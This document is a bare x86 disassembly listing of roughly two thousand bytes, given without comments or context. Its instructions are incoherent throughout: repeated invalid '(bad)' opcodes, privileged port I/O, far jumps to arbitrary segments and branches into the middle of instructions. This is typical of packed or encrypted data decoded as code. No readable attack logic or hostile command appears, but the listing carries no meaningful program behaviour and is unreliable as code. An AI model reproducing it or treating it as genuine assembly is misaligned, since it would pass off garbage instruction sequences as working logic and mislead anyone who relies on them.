  41a74e:	xor    eax,0x4b94b89c
  41a753:	fstp   QWORD PTR [edx]
  41a755:	fmul   DWORD PTR ss:[eax+edx*4-0x1e]
  41a75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75b:	dec    ebp
  41a75c:	fsubp  st(0),st
  41a75e:	push   edx
  41a75f:	xor    edx,ecx
  41a761:	xchg   ebp,eax
  41a762:	gs sub eax,0x3b79608e
  41a768:	(bad)  
  41a769:	out    dx,al
  41a76a:	outs   dx,BYTE PTR ds:[esi]
  41a76b:	dec    ebx
  41a76c:	push   eax
  41a76d:	sub    edx,DWORD PTR [esi+esi*4-0x449eac33]
  41a774:	in     eax,dx
  41a775:	sbb    bl,dh
  41a777:	add    dl,BYTE PTR [esi+0x25]
  41a77a:	push   eax
  41a77b:	and    eax,0x1b307bf9
  41a780:	test   edi,ecx
  41a782:	loop   0x41a772
  41a784:	xchg   ebp,eax
  41a785:	xchg   esp,eax
  41a786:	xchg   BYTE PTR [esi+0x15],cl
  41a789:	mov    al,0x97
  41a78b:	mov    BYTE PTR [eax],cl
  41a78d:	sbb    al,0xaa
  41a78f:	mov    edx,0xd64f2499
  41a794:	mov    eax,ds:0x5b195e21
  41a799:	and    BYTE PTR [ebx],ch
  41a79b:	daa    
  41a79c:	add    al,0x8
  41a79e:	add    ebx,DWORD PTR [esi-0x71]
  41a7a1:	and    al,BYTE PTR [esi+edi*2]
  41a7a4:	rcr    DWORD PTR [edx-0x48],0x5
  41a7a8:	pusha  
  41a7a9:	add    al,0xd8
  41a7ab:	push   ecx
  41a7ac:	inc    eax
  41a7ad:	dec    eax
  41a7ae:	in     al,dx
  41a7af:	add    cl,BYTE PTR [ebx-0x1c]
  41a7b2:	cmp    DWORD PTR [edi+0x44],esi
  41a7b5:	cmc    
  41a7b6:	add    eax,0xcb38d5df
  41a7bb:	jae    0x41a7cf
  41a7bd:	(bad)  [ecx]
  41a7bf:	fisttp QWORD PTR [esi+0x4e]
  41a7c2:	pop    eax
  41a7c3:	lahf   
  41a7c4:	cmp    eax,0x125e16ed
  41a7c9:	retf   0xea11
  41a7cc:	cld    
  41a7cd:	xchg   ebx,eax
  41a7ce:	add    al,0x6f
  41a7d0:	int    0x5b
  41a7d2:	dec    ecx
  41a7d3:	outs   dx,BYTE PTR ds:[esi]
  41a7d4:	mov    ebp,0x2ddf6c0b
  41a7d9:	cli    
  41a7da:	imul   ecx,DWORD PTR [edi],0xa83dbe3a
  41a7e0:	inc    ebx
  41a7e1:	mov    al,ds:0x1a140d85
  41a7e6:	push   edx
  41a7e7:	pop    eax
  41a7e8:	adc    edx,DWORD PTR [edi]
  41a7ea:	jl     0x41a820
  41a7ec:	stos   DWORD PTR es:[edi],eax
  41a7ed:	push   ecx
  41a7ee:	popa   
  41a7ef:	add    bh,BYTE PTR ds:0x8245ebb9
  41a7f5:	dec    ecx
  41a7f6:	xor    al,0x1d
  41a7f8:	sbb    eax,0x5c0af1f3
  41a7fd:	call   0x649:0x86249005
  41a804:	sar    DWORD PTR [edx-0x2f],cl
  41a807:	add    cl,bh
  41a809:	mov    ds:0x1c18a859,eax
  41a80e:	dec    ebx
  41a80f:	adc    al,bh
  41a811:	loop   0x41a7c5
  41a813:	pop    edx
  41a814:	scas   al,BYTE PTR es:[edi]
  41a815:	xlat   BYTE PTR ds:[ebx]
  41a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a817:	cld    
  41a818:	fnsave [esp+eiz*4+0x6]
  41a81c:	xlat   BYTE PTR ds:[ebx]
  41a81d:	adc    al,0xd6
  41a81f:	adc    ah,dl
  41a821:	out    0x25,eax
  41a823:	repnz (bad) [ecx]
  41a826:	int    0x5e
  41a828:	scas   eax,DWORD PTR es:[edi]
  41a829:	fimul  WORD PTR [ebp+0x4d6fdcde]
  41a82f:	and    dl,BYTE PTR [ebx+0x1631c95d]
  41a835:	add    DWORD PTR [ebx],eax
  41a837:	dec    ebx
  41a838:	sub    dh,BYTE PTR [ebx+0x4761c816]
  41a83e:	out    dx,eax
  41a83f:	ror    BYTE PTR [eax-0x32ad9d15],0x27
  41a846:	sub    eax,0x7f141d2f
  41a84b:	add    al,0xea
  41a84d:	mov    ch,0x59
  41a84f:	out    dx,eax
  41a850:	or     bh,BYTE PTR [edx-0x3e222af0]
  41a856:	mov    DWORD PTR [edx-0x4162e69e],esi
  41a85c:	sar    BYTE PTR [edi],cl
  41a85e:	mov    ds:0x4a0bc53f,al
  41a863:	push   edx
  41a864:	inc    eax
  41a865:	and    bh,BYTE PTR [edi-0x3dcdddfd]
  41a86b:	retf   0xe376
  41a86e:	sub    edi,DWORD PTR [ecx*8+0x18312034]
  41a875:	neg    DWORD PTR cs:[ecx-0x2b]
  41a879:	gs jns 0x41a81c
  41a87c:	rcl    cl,0x54
  41a87f:	inc    edx
  41a880:	adc    al,0x2b
  41a882:	int    0x8c
  41a884:	jecxz  0x41a842
  41a886:	sbb    dh,BYTE PTR [ebx]
  41a888:	mov    cl,0xf2
  41a88a:	outs   dx,BYTE PTR ds:[esi]
  41a88b:	rol    edx,cl
  41a88d:	push   esp
  41a88e:	daa    
  41a88f:	mov    DWORD PTR [edx+ebp*2+0xb],ebp
  41a893:	dec    ebp
  41a894:	push   ebx
  41a895:	sti    
  41a896:	retf   
  41a897:	xor    DWORD PTR [eax],ebx
  41a899:	xor    eax,DWORD PTR [ecx]
  41a89b:	jecxz  0x41a8ae
  41a89d:	nop
  41a89e:	pop    eax
  41a89f:	pop    ebx
  41a8a0:	in     al,0x79
  41a8a2:	ins    DWORD PTR es:[edi],dx
  41a8a3:	scas   eax,DWORD PTR es:[edi]
  41a8a4:	and    al,0xee
  41a8a6:	inc    ebx
  41a8a7:	adc    bh,BYTE PTR [ecx+ebp*4+0x13]
  41a8ab:	fwait
  41a8ac:	jp     0x41a83a
  41a8ae:	not    dh
  41a8b0:	mov    eax,DWORD PTR [ecx+ebx*8-0x69]
  41a8b4:	cli    
  41a8b5:	adc    eax,0xf076818b
  41a8ba:	out    0x71,al
  41a8bc:	in     al,0x80
  41a8be:	cwde   
  41a8bf:	xchg   ebx,eax
  41a8c0:	cmp    al,0xb8
  41a8c2:	test   BYTE PTR [edx],bh
  41a8c4:	dec    ebx
  41a8c5:	repz pop DWORD PTR cs:[esi-0x143b905d]
  41a8cd:	repz push 0xb18b66ce
  41a8d3:	dec    esi
  41a8d4:	lds    esp,FWORD PTR [esi]
  41a8d6:	test   edi,0xef08942a
  41a8dc:	cmp    BYTE PTR [eax],al
  41a8de:	dec    ecx
  41a8df:	outs   dx,BYTE PTR ds:[esi]
  41a8e0:	add    esi,DWORD PTR [edi+0x565199cb]
  41a8e6:	aaa    
  41a8e7:	(bad)  
  41a8e9:	push   cs
  41a8ea:	addr16 (bad) 
  41a8ec:	cmp    al,0xdd
  41a8ee:	popa   
  41a8ef:	jbe    0x41a8ee
  41a8f1:	and    edi,0x13
  41a8f4:	and    bl,BYTE PTR [ecx+edi*1-0x3d4b1d9]
  41a8fb:	inc    edi
  41a8fc:	(bad)  
  41a8fd:	cld    
  41a8fe:	jge    0x41a8e3
  41a900:	test   BYTE PTR [ecx-0x7f71f0de],0x2f
  41a907:	pop    eax
  41a908:	int3   
  41a909:	and    bl,BYTE PTR [esi+0x6c85f2d7]
  41a90f:	in     eax,0x25
  41a911:	dec    edi
  41a912:	cs cwde 
  41a914:	mov    bl,BYTE PTR [edx+0x3db08a11]
  41a91a:	cmp    bh,BYTE PTR [ebp-0x3b]
  41a91d:	stos   BYTE PTR es:[edi],al
  41a91e:	inc    eax
  41a91f:	call   0x7f7d:0x11b8737f
  41a926:	gs jmp 0x41a91a
  41a929:	xlat   BYTE PTR ds:[ebx]
  41a92a:	out    dx,eax
  41a92b:	pusha  
  41a92c:	add    al,0x88
  41a92e:	setns  BYTE PTR [ebp-0x70]
  41a932:	sbb    eax,0x34d532b0
  41a937:	jns    0x41a949
  41a939:	ror    DWORD PTR [edx-0x17fbe0c3],0xa
  41a940:	mov    esp,0xa25ee313
  41a945:	mov    al,ds:0x39f83d05
  41a94a:	inc    esp
  41a94b:	punpckldq mm5,DWORD PTR [ebx-0x77]
  41a94f:	outs   dx,DWORD PTR ds:[esi]
  41a950:	jbe    0x41a96a
  41a952:	mov    al,ds:0x5e8c436f
  41a957:	and    dl,ch
  41a959:	xor    bl,BYTE PTR [ebp-0x477f82e7]
  41a95f:	adc    dl,BYTE PTR [edi]
  41a961:	sbb    dl,BYTE PTR [esi-0x59406ec3]
  41a967:	fucom  st(4)
  41a969:	mov    dl,0x97
  41a96b:	fisttp DWORD PTR [ebx]
  41a96d:	mov    dl,0x52
  41a96f:	in     eax,dx
  41a970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a971:	sti    
  41a972:	cmp    BYTE PTR [edi+0x6c225856],0xc8
  41a979:	and    ebp,DWORD PTR [eax+0x1884b393]
  41a97f:	stos   DWORD PTR es:[edi],eax
  41a980:	inc    edi
  41a981:	in     eax,0x70
  41a983:	hlt    
  41a984:	mov    edx,0xcf8510d5
  41a989:	les    ecx,FWORD PTR [esp+eiz*4]
  41a98c:	fcmovb st,st(1)
  41a98e:	int3   
  41a98f:	jnp    0x41a928
  41a991:	(bad)  
  41a993:	stc    
  41a994:	mov    dl,0x81
  41a996:	pusha  
  41a997:	mov    ch,0xa9
  41a999:	in     eax,0xbb
  41a99b:	push   ecx
  41a99c:	dec    edi
  41a99d:	scas   eax,DWORD PTR es:[edi]
  41a99e:	xchg   edi,eax
  41a99f:	test   DWORD PTR [esi-0x59],edi
  41a9a2:	pop    ds
  41a9a3:	stc    
  41a9a4:	pop    ebp
  41a9a5:	aaa    
  41a9a6:	or     eax,0x1bae1730
  41a9ab:	push   es
  41a9ac:	sbb    al,al
  41a9ae:	fidivr WORD PTR [edx]
  41a9b0:	push   ebp
  41a9b1:	pop    fs
  41a9b3:	(bad)  
  41a9b5:	mov    ebx,0x31cf0e7c
  41a9ba:	cmp    al,0xd4
  41a9bc:	pop    ecx
  41a9bd:	dec    BYTE PTR [ebx-0x69]
  41a9c0:	mov    DWORD PTR [ecx-0xa],edi
  41a9c3:	cdq    
  41a9c4:	jnp    0x41a969
  41a9c6:	les    ebx,FWORD PTR [edx-0x47e8c894]
  41a9cc:	and    eax,DWORD PTR [eax-0x57]
  41a9cf:	aas    
  41a9d0:	imul   esp,DWORD PTR [edi+eiz*4-0x27dfc87a],0xffffff81
  41a9d8:	cli    
  41a9d9:	sub    DWORD PTR [ebp+0x57],edi
  41a9dc:	add    eax,0x84d81025
  41a9e1:	push   ebx
  41a9e2:	xchg   esp,eax
  41a9e3:	retf   0x556d
  41a9e6:	icebp  
  41a9e7:	adc    edi,eax
  41a9e9:	or     al,0xf3
  41a9eb:	js     0x41aa11
  41a9ed:	lock mov al,0x83
  41a9f0:	fdivr  st,st(2)
  41a9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9f3:	dec    edi
  41a9f4:	inc    ebp
  41a9f5:	cdq    
  41a9f6:	fild   QWORD PTR [ecx+ebp*4+0x6d6574a8]
  41a9fd:	in     eax,dx
  41a9fe:	sub    eax,0xc32f042d
  41aa03:	sahf   
  41aa04:	mov    ebx,0x803ce5d3
  41aa09:	mov    dh,0x3a
  41aa0b:	jae    0x41aa2d
  41aa0d:	add    al,0xa7
  41aa0f:	pop    ebx
  41aa10:	xor    BYTE PTR [ebx+0x56b90172],cl
  41aa16:	scas   al,BYTE PTR es:[edi]
  41aa17:	not    BYTE PTR [ecx]
  41aa19:	mov    bh,0x4b
  41aa1b:	imul   edx,DWORD PTR gs:[ebp+0x4d],0xc36a8d2d
  41aa23:	cmp    eax,0xfec2501f
  41aa28:	out    0x1,eax
  41aa2a:	je     0x41aa35
  41aa2c:	test   BYTE PTR [ebx-0x2b12430],bh
  41aa32:	xor    cl,0x44
  41aa35:	lods   al,BYTE PTR ds:[esi]
  41aa36:	neg    BYTE PTR [ebx+0x1941c3ff]
  41aa3c:	pop    edx
  41aa3d:	mov    edi,0xcabf197f
  41aa42:	lods   al,BYTE PTR ds:[esi]
  41aa43:	call   0x652730ba
  41aa48:	jmp    0x2840144e
  41aa4d:	loope  0x41aaaf
  41aa4f:	(bad)  
  41aa50:	mov    DWORD PTR [edx+0x2e113295],esi
  41aa56:	dec    edi
  41aa57:	cs push ebp
  41aa59:	and    BYTE PTR [esi-0x72],ch
  41aa5c:	push   esp
  41aa5d:	push   esi
  41aa5e:	cmp    BYTE PTR [eax],cl
  41aa60:	cmc    
  41aa61:	xor    BYTE PTR [edx+0x16],ah
  41aa64:	and    eax,0x84b93c5c
  41aa69:	pop    edi
  41aa6a:	inc    edx
  41aa6b:	sub    al,0x2b
  41aa6d:	mov    ebx,0xec391eef
  41aa72:	add    DWORD PTR [ebx+ebx*2-0x6f2b7b82],ebx
  41aa79:	pop    ds
  41aa7a:	xor    esi,DWORD PTR [edx+0x29]
  41aa7d:	inc    ebx
  41aa7e:	cs cmc 
  41aa80:	dec    edx
  41aa81:	mov    edx,0xaef58c3b
  41aa86:	ret    0x6d7c
  41aa89:	cli    
  41aa8a:	sbb    eax,0xbee37a94
  41aa8f:	icebp  
  41aa90:	inc    ecx
  41aa91:	xchg   edx,eax
  41aa92:	and    eax,0x2cb4e55d
  41aa97:	sbb    al,0x89
  41aa99:	mul    BYTE PTR [ebx]
  41aa9b:	xchg   edi,eax
  41aa9c:	pop    ebx
  41aa9d:	xchg   ah,bh
  41aa9f:	out    0xb7,al
  41aaa1:	leave  
  41aaa2:	loopne 0x41aa35
  41aaa4:	add    ch,dl
  41aaa6:	shr    BYTE PTR [esp+eax*2],1
  41aaa9:	add    DWORD PTR ds:0x63697132,eax
  41aaaf:	fcomp  DWORD PTR [edi]
  41aab1:	cmp    DWORD PTR [ebx+0x7a49ceea],ebx
  41aab7:	xor    BYTE PTR [edi+ebp*2+0x55],0x5d
  41aabc:	xchg   ebp,eax
  41aabd:	(bad)  
  41aabe:	sti    
  41aabf:	clc    
  41aac0:	mov    ch,0x27
  41aac2:	ret    0xcaa5
  41aac5:	dec    eax
  41aac6:	call   0x2fec:0xc37dac
  41aacd:	and    al,0xba
  41aacf:	lds    eax,FWORD PTR [esi+0x1c61f8c0]
  41aad5:	popf   
  41aad6:	jb     0x41aa7d
  41aad8:	inc    esp
  41aad9:	in     eax,dx
  41aada:	dec    edi
  41aadb:	mov    esp,0x2a73c779
  41aae0:	out    0x15,eax
  41aae2:	mul    DWORD PTR [ecx]
  41aae4:	bound  edx,QWORD PTR [ebx+0x18569928]
  41aaea:	cld    
  41aaeb:	test   al,0xaf
  41aaed:	mov    dl,0xd6
  41aaef:	jp     0x41aa72
  41aaf1:	stos   BYTE PTR es:[edi],al
  41aaf2:	jnp    0x41aae9
  41aaf4:	retf   0x15b7
  41aaf7:	push   ss
  41aaf8:	xchg   ebx,eax
  41aaf9:	fwait
  41aafa:	push   cs
  41aafb:	lea    esi,[eax]
  41aafd:	loop   0x41ab1a
  41aaff:	imul   ebp,esi,0xffffffce
  41ab02:	inc    edi
  41ab03:	cmp    DWORD PTR [edx],eax
  41ab05:	jo     0x41ab26
  41ab07:	inc    ebp
  41ab08:	add    BYTE PTR [ebx+0x16e2b31f],dl
  41ab0e:	aad    0xb7
  41ab10:	inc    ebx
  41ab11:	xor    al,0x35
  41ab13:	xor    eax,0x8431a25b
  41ab18:	inc    eax
  41ab19:	pop    ecx
  41ab1a:	or     eax,0xcc1c7368
  41ab1f:	push   ecx
  41ab20:	jmp    0x9518:0x54a986da
  41ab27:	nop    cx
  41ab2b:	cmp    ebp,DWORD PTR [ecx-0x49321b58]
  41ab31:	push   ss
  41ab32:	popa   
  41ab33:	sahf   
  41ab34:	mov    ds:0x6ae25015,eax
  41ab39:	or     BYTE PTR [esi+0x7],dh
  41ab3c:	dec    esi
  41ab3d:	or     eax,0x9bda87b4
  41ab42:	jo     0x41ab01
  41ab44:	pop    ebp
  41ab45:	addr16 fs xor ah,ah
  41ab49:	(bad)  
  41ab4a:	lahf   
  41ab4b:	and    al,0x95
  41ab4d:	ja     0x41ab4b
  41ab4f:	add    BYTE PTR [ebx+0x11c94407],cl
  41ab55:	pop    esp
  41ab56:	scas   al,BYTE PTR es:[edi]
  41ab57:	push   0x5e7fd33c
  41ab5c:	mov    al,ds:0x794b794a
  41ab61:	int    0xa1
  41ab63:	scas   eax,DWORD PTR es:[edi]
  41ab64:	bound  ebp,QWORD PTR [ebx]
  41ab66:	add    BYTE PTR [ecx],0x36
  41ab69:	(bad)  
  41ab6b:	aam    0x20
  41ab6d:	arpl   di,di
  41ab6f:	mov    ebx,0xc284e419
  41ab74:	scas   al,BYTE PTR es:[edi]
  41ab75:	jbe    0x41ab7e
  41ab77:	push   ecx
  41ab78:	mov    bl,0xe6
  41ab7a:	out    dx,al
  41ab7b:	stos   DWORD PTR es:[edi],eax
  41ab7c:	mov    edi,0xdaf7205d
  41ab81:	cli    
  41ab82:	add    al,al
  41ab84:	iret   
  41ab85:	or     al,0x4b
  41ab87:	push   ss
  41ab88:	loopne 0x41abca
  41ab8a:	fcomp  QWORD PTR [esi]
  41ab8c:	inc    eax
  41ab8d:	icebp  
  41ab8e:	pop    edi
  41ab8f:	cmp    DWORD PTR [eax],ebx
  41ab91:	inc    esi
  41ab92:	scas   al,BYTE PTR es:[edi]
  41ab93:	cmp    DWORD PTR [edx+0x25],edi
  41ab96:	jg     0x41abbc
  41ab98:	push   edx
  41ab99:	dec    eax
  41ab9a:	clc    
  41ab9b:	popa   
  41ab9c:	push   0x1fbfe687
  41aba1:	mov    eax,DWORD PTR [ecx+edx*8-0x8]
  41aba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba6:	stos   DWORD PTR es:[edi],eax
  41aba7:	loope  0x41ac17
  41aba9:	hlt    
  41abaa:	imul   ecx,DWORD PTR [ebp-0x63e59610],0xffffffe4
  41abb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb2:	mov    dl,0x5e
  41abb4:	lods   al,BYTE PTR ds:[esi]
  41abb5:	inc    ebp
  41abb6:	mov    dl,0xe
  41abb8:	or     al,0x8c
  41abba:	and    eax,0x8e813cde
  41abbf:	(bad)  
  41abc0:	iret   
  41abc1:	sbb    dh,BYTE PTR [ecx+ecx*2+0x5c6831f1]
  41abc8:	push   ebx
  41abc9:	jnp    0x41ab60
  41abcb:	repnz retf 
  41abcd:	adc    dl,BYTE PTR [ebx-0x4b]
  41abd0:	pop    esp
  41abd1:	mov    ds:0x452fcba1,eax
  41abd6:	xor    BYTE PTR [esp+ebp*8],dh
  41abd9:	cmp    cl,ch
  41abdb:	dec    ebp
  41abdc:	int    0xbb
  41abde:	arpl   WORD PTR [edi],si
  41abe0:	stos   BYTE PTR es:[edi],al
  41abe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe2:	or     edx,DWORD PTR [esp+eax*4+0x7166dea2]
  41abe9:	inc    ebp
  41abea:	aas    
  41abeb:	add    BYTE PTR [ebp+esi*1+0x3c],bl
  41abef:	inc    edi
  41abf0:	cmp    al,0x5a
  41abf2:	inc    edi
  41abf3:	or     DWORD PTR ds:0x4140c2d2,0xffffff8b
  41abfa:	xchg   ch,ch
  41abfc:	jnp    0x41abab
  41abfe:	fs jmp 0xbb7:0x196879c
  41ac06:	(bad)  
  41ac07:	fsub   DWORD PTR [esi+0x7716988e]
  41ac0d:	jne    0x41ac31
  41ac0f:	std    
  41ac10:	leave  
  41ac11:	ss iret 
  41ac13:	push   esp
  41ac14:	(bad)  
  41ac15:	mov    dl,0x1c
  41ac17:	jp     0x41abe1
  41ac19:	mov    ebp,DWORD PTR [ebx]
  41ac1b:	aas    
  41ac1c:	in     al,0x16
  41ac1e:	add    edi,DWORD PTR [ebx+0x6c]
  41ac21:	add    ebp,DWORD PTR [ecx]
  41ac23:	pcmpeqw mm1,QWORD PTR [edx+0x1]
  41ac27:	adc    BYTE PTR [ecx-0x20],bh
  41ac2a:	into   
  41ac2b:	mov    bl,0xde
  41ac2d:	jne    0x41aca9
  41ac2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac30:	jp     0x41abfa
  41ac32:	jmp    0x34ff:0x79b4d56d
  41ac39:	les    ecx,FWORD PTR [edx]
  41ac3b:	inc    edx
  41ac3c:	setge  BYTE PTR [eax-0x2d]
  41ac40:	cmp    al,0x86
  41ac42:	in     al,dx
  41ac43:	push   edi
  41ac44:	je     0x41aca8
  41ac46:	mov    ch,0x4d
  41ac48:	jmp    0xa46e:0xe6b3883f
  41ac4f:	arpl   cx,sp
  41ac51:	xor    eax,0x54f519bf
  41ac56:	cmp    DWORD PTR [edx+ecx*2],0x65
  41ac5a:	popa   
  41ac5b:	xchg   esi,eax
  41ac5c:	jnp    0x41acaf
  41ac5e:	stc    
  41ac5f:	mov    esp,0x99ac020b
  41ac64:	call   0xba09921e
  41ac69:	shl    BYTE PTR [ecx+0x2c16ba74],1
  41ac6f:	dec    ecx
  41ac70:	xor    BYTE PTR [esi-0x36cea8fc],0xea
  41ac77:	jae    0x41ac21
  41ac79:	paddb  mm2,QWORD PTR [esi]
  41ac7c:	sub    edx,esi
  41ac7e:	ficom  DWORD PTR [edi]
  41ac80:	fwait
  41ac81:	push   esi
  41ac82:	icebp  
  41ac83:	mov    ebp,0x148f39b0
  41ac88:	jo     0x41ad00
  41ac8a:	sbb    al,0x24
  41ac8c:	dec    DWORD PTR [edi-0x73]
  41ac8f:	jns    0x41ac9f
  41ac91:	mov    ebp,0x5a0652d
  41ac96:	fcmovne st,st(7)
  41ac98:	in     al,0xc6
  41ac9a:	and    eax,0x3888b3e7
  41ac9f:	sub    al,0xbc
  41aca1:	and    BYTE PTR [ebp-0x67],al
  41aca4:	or     eax,0xab5cc54c
  41aca9:	push   ds
  41acaa:	mov    edx,0x416f644c
  41acaf:	int    0x6e
  41acb1:	in     al,dx
  41acb2:	mov    DWORD PTR [ebx],ebp
  41acb4:	or     BYTE PTR [edi+esi*4],al
  41acb7:	sbb    DWORD PTR [edx-0x3a81fea9],ebx
  41acbd:	repz dec edx
  41acbf:	push   esi
  41acc0:	xor    DWORD PTR [ebx+0x2e2a25cf],esi
  41acc6:	xor    al,0x35
  41acc8:	and    BYTE PTR [edi],dh
  41acca:	xchg   ebx,eax
  41accb:	adc    dh,al
  41accd:	pop    ebp
  41acce:	aaa    
  41accf:	hlt    
  41acd0:	fs ja  0x41ad1e
  41acd3:	dec    ebp
  41acd4:	outs   dx,DWORD PTR ds:[esi]
  41acd5:	adc    ebx,DWORD PTR [ebx]
  41acd7:	sbb    esp,DWORD PTR [ebx+0x3ca31b33]
  41acdd:	scas   eax,DWORD PTR es:[edi]
  41acde:	aad    0xdd
  41ace0:	xchg   esi,eax
  41ace1:	outs   dx,DWORD PTR ds:[esi]
  41ace2:	mov    ds:0x53636e87,eax
  41ace7:	es and al,0x66
  41acea:	xor    DWORD PTR ds:0x34fbc328,edx
  41acf0:	fidivr WORD PTR [ebp-0x9]
  41acf3:	inc    ebx
  41acf4:	push   ebp
  41acf5:	fs ret 0x38d7
  41acf9:	scas   eax,DWORD PTR es:[edi]
  41acfa:	push   cs
  41acfb:	cmc    
  41acfc:	dec    ebp
  41acfd:	mov    BYTE PTR [esi],0xf7
  41ad00:	pop    esp
  41ad01:	int3   
  41ad02:	xchg   DWORD PTR ds:[si-0x4],ebp
  41ad07:	pop    esp
  41ad08:	mov    eax,0x5eb44625
  41ad0d:	ja     0x41acc8
  41ad0f:	pop    ecx
  41ad10:	stos   BYTE PTR es:[edi],al
  41ad11:	xchg   DWORD PTR [esi],ebx
  41ad13:	push   esi
  41ad14:	sbb    bh,BYTE PTR [eax+0x3ad24b48]
  41ad1a:	cdq    
  41ad1b:	fs in  al,0x81
  41ad1e:	dec    ebp
  41ad1f:	lds    edi,FWORD PTR [esp+eiz*4+0x5f]
  41ad23:	push   esp
  41ad24:	dec    esi
  41ad25:	cmp    DWORD PTR [ebx-0x77ed6c93],esi
  41ad2b:	jmp    0x41ad8b
  41ad2d:	dec    esp
  41ad2e:	sbb    eax,edx
  41ad30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad31:	popf   
  41ad32:	cli    
  41ad33:	ins    BYTE PTR es:[edi],dx
  41ad34:	adc    al,0x80
  41ad36:	jb     0x41ad0d
  41ad38:	jo     0x41ad03
  41ad3a:	jmp    0x96f:0x50782ce9
  41ad41:	cmp    bl,bh
  41ad43:	outs   dx,DWORD PTR ds:[esi]
  41ad44:	test   BYTE PTR [ebx],0x3e
  41ad47:	jl     0x41ad27
  41ad49:	xlat   BYTE PTR ds:[ebx]
  41ad4a:	fdivr  st,st(0)
  41ad4c:	cmp    bl,BYTE PTR [edx]
  41ad4e:	push   es
  41ad4f:	(bad)  
  41ad50:	sbb    al,0x16
  41ad52:	adc    DWORD PTR [edx-0x5e17381e],ecx
  41ad58:	leave  
  41ad59:	cwde   
  41ad5a:	sbb    BYTE PTR [ebx-0x6a],ch
  41ad5d:	push   ds
  41ad5e:	mov    esp,0x2b750261
  41ad63:	push   eax
  41ad64:	jp     0x41ad97
  41ad66:	out    dx,al
  41ad67:	lock mov ch,0x10
  41ad6a:	push   0x3a
  41ad6c:	add    BYTE PTR [ebx-0x9c4f38],ch
  41ad72:	sbb    DWORD PTR [edx+eiz*2+0x51f2ee2a],edi
  41ad79:	sbb    BYTE PTR [ebp+0x7d541f45],ch
  41ad7f:	call   0x3876:0x123c4cce
  41ad86:	bnd jbe 0x41ad5b
  41ad89:	pop    esp
  41ad8a:	sbb    eax,0x2d8f639a
  41ad8f:	popa   
  41ad90:	in     eax,dx
  41ad91:	mov    ebx,0x2fa88b69
  41ad96:	dec    edx
  41ad97:	aas    
  41ad98:	scas   eax,DWORD PTR es:[edi]
  41ad99:	int3   
  41ad9a:	push   esp
  41ad9b:	adc    eax,0xdc57a17
  41ada0:	imul   edx,DWORD PTR [ebx-0x6a43fb17],0x71
  41ada7:	scas   eax,DWORD PTR es:[edi]
  41ada8:	mov    edx,gs
  41adaa:	adc    edi,ebx
  41adac:	sbb    esi,DWORD PTR [eax-0x49]
  41adaf:	je     0x41ad6f
  41adb1:	push   ebx
  41adb2:	xchg   esp,eax
  41adb3:	test   eax,0x1233bbdb
  41adb8:	test   BYTE PTR ds:0x4f425014,bl
  41adbe:	jle    0x41add9
  41adc0:	sbb    ch,BYTE PTR [edx]
  41adc2:	xchg   DWORD PTR [esi],edi
  41adc4:	jns    0x41adb6
  41adc6:	xchg   esi,eax
  41adc7:	into   
  41adc8:	mov    ds:0xa1883c8a,eax
  41adcd:	and    eax,0x65428e06
  41add2:	xchg   ecx,eax
  41add3:	sub    eax,ebp
  41add5:	ret    
  41add6:	jno    0x41adeb
  41add8:	mov    cl,BYTE PTR [ecx+0x18]
  41addb:	and    eax,0x5295bd92
  41ade0:	popf   
  41ade1:	dec    ecx
  41ade2:	xor    eax,0x5d8af5fc
  41ade7:	mov    eax,ds:0x7a37b051
  41adec:	cmp    al,0xe1
  41adee:	push   0xb660ac6a
  41adf3:	xchg   ebx,eax
  41adf4:	shl    DWORD PTR [edi],1
  41adf6:	cmp    dh,BYTE PTR ds:0xb2f7a9c
  41adfc:	cdq    
  41adfd:	sub    DWORD PTR [edx+0x6c],0x21a057f9
  41ae04:	and    BYTE PTR [ecx-0x5e4b106a],dh
  41ae0a:	and    edi,esi
  41ae0c:	xor    BYTE PTR [ecx],dl
  41ae0e:	pop    ss
  41ae0f:	pop    ebp
  41ae10:	jmp    0xc9804317
  41ae15:	push   edi
  41ae16:	jmp    DWORD PTR [edi+0x76]
  41ae19:	test   al,0xf6
  41ae1b:	aad    0x4a
  41ae1d:	aam    0x22
  41ae1f:	scas   al,BYTE PTR es:[edi]
  41ae20:	sbb    DWORD PTR [edi+ebx*4-0x65606f36],0x6c5570e1
  41ae2b:	aaa    
  41ae2c:	in     al,dx
  41ae2d:	ret    
  41ae2e:	ror    DWORD PTR [ecx+0x7a71a44b],0x38
  41ae35:	bound  eax,QWORD PTR [eax+0x63]
  41ae38:	addr16 int3 
  41ae3a:	imul   eax,esi,0xffffffd1
  41ae3d:	nop
  41ae3e:	int    0xb5
  41ae40:	dec    edi
  41ae41:	fwait
  41ae42:	sub    BYTE PTR [edi],dl
  41ae44:	fldenv [edx]
  41ae46:	cdq    
  41ae47:	mov    al,ds:0xf4e04a9a
  41ae4c:	les    eax,FWORD PTR [edi+ebx*4-0x286770ca]
  41ae53:	cld    
  41ae54:	sbb    al,0x55
  41ae56:	fst    DWORD PTR [eax+esi*8+0x65]
  41ae5a:	cs fdiv st,st(5)
  41ae5d:	mov    al,cl
  41ae5f:	xor    esp,esp
  41ae61:	ss push ebp
  41ae63:	ds (bad) 
  41ae65:	mov    ds:0xf6c3bdd9,al
  41ae6a:	test   bl,cl
  41ae6c:	test   BYTE PTR [ecx],ah
  41ae6e:	jl     0x41aed6
  41ae70:	fist   WORD PTR [esi+ebx*2+0x65479458]
  41ae77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae78:	sub    esi,0xce968022
  41ae7e:	jnp    0x41aeb6
  41ae80:	xchg   edx,eax
  41ae81:	mov    BYTE PTR [eax-0x8],bh
  41ae84:	aad    0x14
  41ae86:	push   edx
  41ae87:	repz cli 
  41ae89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8a:	jle    0x41ae8f
  41ae8c:	jge    0x41ae3a
  41ae8e:	or     eax,ebx
  41ae90:	test   DWORD PTR [ebx+0x16],ecx
  41ae93:	popa   
  41ae94:	or     BYTE PTR ds:0x1f9d084c,dh
